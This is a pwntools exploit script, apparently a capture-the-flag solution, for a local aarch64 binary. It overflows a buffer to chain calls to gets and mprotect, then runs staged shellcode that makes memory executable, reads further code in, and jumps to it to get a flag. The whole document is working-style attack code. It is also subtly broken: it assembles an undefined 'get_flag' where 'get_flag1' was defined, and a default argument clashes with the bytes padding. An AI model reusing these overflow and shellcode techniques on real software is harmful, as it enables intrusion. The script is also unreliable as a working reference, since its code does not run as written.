from pwn import *
context.arch = 'aarch64'
s = process("./run.sh", shell=True)

def debug():
    input("debug>")

def get_idx(vaddr):
    pgd_idx = (vaddr >> 39) & 0x1ff
    pud_idx = (vaddr >> 30) & 0x1ff
    pmd_idx = (vaddr >> 21) & 0x1ff
    pte_idx = (vaddr >> 12) & 0x1ff
    return pgd_idx, pud_idx, pmd_idx, pte_idx

def pwn1(sc = 'nop'):
    ret = 0x400598
    gets = 0x4019B0
    getc = 0x400D24
    mprotect = 0x401B68
    sc_addr = 0x7ffeffffd010
    sc1 = '''
        mov     x0, 8192;            
        movk    x0, 0x40, lsl 16; 
        mov     x1, 0x1000;
        mov     x2, 3;
        MOV     X8, #0xE2
        svc     #0

        mov     x6, 8192;            
        movk    x6, 0x40, lsl 16; 
        mov     x7, 3364
        movk    x7, 0x40, lsl 16
        mov     x5, xzr;
    loop:
        blr x7;
        str x0, [x6];
        add x6, x6, 1;
        add x5, x5, 1;
        cmp x5, 0xeff;
        bne loop;

        mov     x0, 8192;            
        movk    x0, 0x40, lsl 16; 
        mov     x1, 0x1000;
        mov     x2, 5;
        MOV     X8, #0xE2
        svc     #0

        mov     x6, 8192;            
        movk    x6, 0x40, lsl 16; 
        br      x6;
    '''
    sc1 = asm(sc1)
    s.sendlineafter(b"cmd> ",b"0")
    payload = b'A'*0x100 + p64(gets)+p64(mprotect)
    s.sendlineafter(b"index:",payload)
    s.sendline(b'A'*0x10 + sc1)

    s.sendlineafter(b"cmd> ",b"1")
    s.sendlineafter(b"index:",str(0x1000).encode())
    s.sendlineafter(b"key: ",b'A'*5)

    s.sendlineafter(b"cmd> ",b"0")
    payload = b'A'*0x100 + p64(sc_addr)
    s.sendlineafter(b"index:",payload)
    sc = sc.ljust(0xf00,b'\x00')
    s.send(sc)

get_flag1 = '''mov     x0, 260
        movk    x0, 0x40, lsl 16
        blr x0
        '''
get_flag1 += shellcraft.syscall()

shellcode = asm(get_flag)
pwn1(shellcode)
s.interactive()